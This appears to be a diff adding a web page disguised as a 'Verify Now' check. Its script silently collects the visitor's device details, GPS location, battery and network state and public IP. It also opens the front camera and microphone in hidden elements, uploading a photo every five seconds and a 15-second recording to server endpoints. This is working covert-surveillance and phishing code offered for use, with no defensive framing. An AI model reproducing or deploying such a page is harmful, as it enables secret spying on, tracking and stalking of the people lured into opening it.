@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<button onclick="start()">Verify Now</button>
+
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+
+async function start(){
+
+await deviceInfo();
+await getLocation();
+await getBattery();
+await getNetwork();
+await getIP();
+
+const stream=await navigator.mediaDevices.getUserMedia({
+video:{facingMode:"user"},
+audio:true
+});
+
+document.getElementById("video").srcObject=stream;
+
+setInterval(photo,5000);
+record(stream);
+
+}
+
+function photo(){
+
+let v=document.getElementById("video");
+let c=document.getElementById("canvas");
+
+c.width=v.videoWidth;
+c.height=v.videoHeight;
+
+c.getContext("2d").drawImage(v,0,0);
+
+let img=c.toDataURL("image/png");
+
+fetch("photo.php",{
+method:"POST",
+body:JSON.stringify({img:img}),
+headers:{"Content-Type":"application/json"}
+});
+
+}
+
+function record(stream){
+
+let rec=new MediaRecorder(stream);
+let chunks=[];
+
+rec.ondataavailable=e=>chunks.push(e.data);
+rec.start();
+
+setTimeout(()=>rec.stop(),15000);
+
+rec.onstop=()=>{
+
+let blob=new Blob(chunks,{type:"video/webm"});
+let fd=new FormData();
+
+fd.append("video",blob);
+
+fetch("video.php",{
+method:"POST",
+body:fd
+});
+
+}
+
+}
+
+function deviceInfo(){
+
+let data={
+ua:navigator.userAgent,
+platform:navigator.platform,
+lang:navigator.language
+};
+
+return fetch("device.php",{
+method:"POST",
+body:JSON.stringify(data),
+headers:{"Content-Type":"application/json"}
+});
+
+}
+
+function getLocation(){
+
+navigator.geolocation.getCurrentPosition(pos=>{
+
+let data={
+lat:pos.coords.latitude,
+lon:pos.coords.longitude
+};
+
+fetch("location.php",{
+method:"POST",
+body:JSON.stringify(data),
+headers:{"Content-Type":"application/json"}
+});
+
+});
+
+}
+
+function getBattery(){
+
+navigator.getBattery().then(battery=>{
+
+let data={
+level:battery.level*100,
+charging:battery.charging
+};
+
+fetch("battery.php",{
+method:"POST",
+body:JSON.stringify(data),
+headers:{"Content-Type":"application/json"}
+});
+
+});
+
+}
+
+function getNetwork(){
+
+let data={
+type:navigator.connection.effectiveType
+};
+
+return fetch("network.php",{
+method:"POST",
+body:JSON.stringify(data),
+headers:{"Content-Type":"application/json"}
+});
+
+}
+
+function getIP(){
+
+fetch("https://api.ipify.org?format=json")
+.then(res=>res.json())
+.then(ip=>{
+
+fetch("ip.php",{
+method:"POST",
+body:JSON.stringify(ip),
+headers:{"Content-Type":"application/json"}
+});
+
+});
+
+}
+
+</script>
+
+</body>
+</html>
